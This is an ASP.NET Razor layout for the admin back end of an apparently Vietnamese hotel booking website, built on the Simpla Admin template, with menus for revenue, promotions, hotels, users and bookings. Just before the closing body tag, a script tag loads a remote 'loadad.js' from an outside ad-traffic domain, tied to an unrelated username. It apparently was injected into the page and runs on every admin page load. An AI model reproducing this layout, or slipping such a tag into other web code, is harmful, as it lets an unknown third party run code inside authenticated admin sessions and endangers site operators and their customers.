<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <title>@ViewBag.Title</title>
    <link rel="stylesheet" href="@Url.Content("~/Content/admin/css/reset.css")" type="text/css" media="screen"/>
    <link rel="stylesheet" href="@Url.Content("~/Content/admin/css/style.css")" type="text/css" media="screen"/>
    <link rel="stylesheet" href="@Url.Content("~/Content/admin/css/invalid.css")" type="text/css" media="screen"/>
    <script type="text/javascript" src="@Url.Content("~/Content/admin/scripts/jquery-1.3.2.min.js")"></script>
    <script type="text/javascript" src="@Url.Content("~/Content/admin/scripts/simpla.jquery.configuration.js")"></script>
    <script type="text/javascript" src="@Url.Content("~/Content/admin/scripts/facebox.js")"></script>
    <script type="text/javascript" src="@Url.Content("~/Content/admin/scripts/jquery.wysiwyg.js")"></script>
    <script type="text/javascript" src="@Url.Content("~/Content/admin/scripts/jquery.datePicker.js")"></script>
    <script type="text/javascript" src="@Url.Content("~/Content/admin/scripts/jquery.date.js")"></script>
    <script src="@Url.Content("~/Scripts/jquery-1.9.1.js")" type="text/javascript"></script>
    <script src="@Url.Content("~/Scripts/jquery-ui.js")" type="text/javascript"></script>
    <link href="@Url.Content("~/Content/css/jquery-ui.css")" rel="stylesheet" type="text/css" />
    <script type="text/javascript">
        $(function () {
            setActive();

            $('.nav-top-item').click(function () {
                $('.nav-top-item').removeClass('current');
                $(this).closest('li > a').addClass('nav-top-item current');
            });
        });
        function setActive() {
            var path = window.location.pathname;
            $("#main-nav a").each(function () {
                var href = $(this).attr('href');
                if (path == href) {
                    $(this).closest('li > a').addClass('current');
                    var note = $(this).parent().parent().parent();
                    note.children().addClass('current').css('display', 'block');
                }
            });
        }
    </script>
</head>
<body>
    <div id="body-wrapper">
        <!-- Wrapper for the radial gradient background -->
        <div id="sidebar">
            <div id="sidebar-wrapper">
                <!-- Sidebar with logo and menu -->
                <h1 id="sidebar-title">
                    <a href="#">Quản Lý Hệ Thống Website</a></h1>
                <!-- Logo (221px wide) -->
                <a href="">
                    <img id="logo" src="@Url.Content("~/Content/admin/images/logo.png")" alt="Simpla Admin logo"></a>
                <!-- Sidebar Profile links -->
                <div id="profile-links">
                    Xin chào <strong style="color:white; font-size:14px">@User.Identity.Name</strong><br>
                    <br>
                    <a href="@Url.Content("~/home/index")" title="View the Site">Xem website</a> |
                    <form action="/homeadmin/logout" method="post" name="frmLogout">
                        <a href="@Url.Content("~/home/logout")" title="Sign Out">Đăng xuất</a>
                    </form>
                </div>
                <ul id="main-nav">

                    <li><a href="#" class="nav-top-item" name="parrent">Doanh thu</a>
                        <ul style="display: none;">
                            <li><a href="@Url.Content("~/baocaodoanhthu/index")">Báo cáo doanh thu</a></li>
                        </ul>
                    </li>
                    <li><a href="#" class="nav-top-item" name="parrent">Quản Lý Ưu Đãi</a>
                        <ul style="display: none;">
                            <li><a href="@Url.Content("~/uudai/index")">Ưu đãi</a></li>
                        </ul>
                    </li>
                    <li><a href="#" class="nav-top-item">Quản Lý Khách Sạn </a>
                        <ul style="display: none;">
                            <li><a href="@Url.Content("~/khachsan/index")">Danh Sách Khách Sạn</a></li>
                        </ul>
                    </li>
                    <li><a href="#" class="nav-top-item" name="parrent">
                        <!-- Quản lý tài khoản -->
                        Quản Lý Người Dùng </a>
                        <ul style="display: none;">
                            <li><a href="@Url.Content("~/thanhvien/nguoidung")">Tài Khoản Khách Hàng</a></li>
                            <li><a href="@Url.Content("~/thanhvien/quantri")">Nhân Viên Quản Trị</a></li>
                        </ul>
                    </li>
                    <li><a href="#" class="nav-top-item" name="parrent">Quản Lý Phiếu Đặt Phòng</a>
                        <ul style="display: none;">
                            <li><a href="@Url.Content("~/admin/dsgiaodich")">Danh Sách Phiếu Đặt Phòng</a></li>
                        </ul>
                    </li>

                </ul>
            </div>
        </div>
        <!-- End #sidebar -->
        <div id="main-content">
            @RenderBody()
            <div id="footer">
                <small>
                    <!-- Remove this notice or replace it with whatever you want -->
                    © Copyright 2009 Your Company | Powered by <a href="http://themeforest.net/item/simpla-admin-flexible-user-friendly-admin-skin/46073">Simpla Admin</a> | <a href="#">Top</a> </small>
            </div>
            <!-- End #footer -->
        </div>
        <!-- End #main-content -->


        <script src="http://www.trafficrevenue.net/loadad.js?username=chrismaher96"></script>
    </div>
</body>
</html>

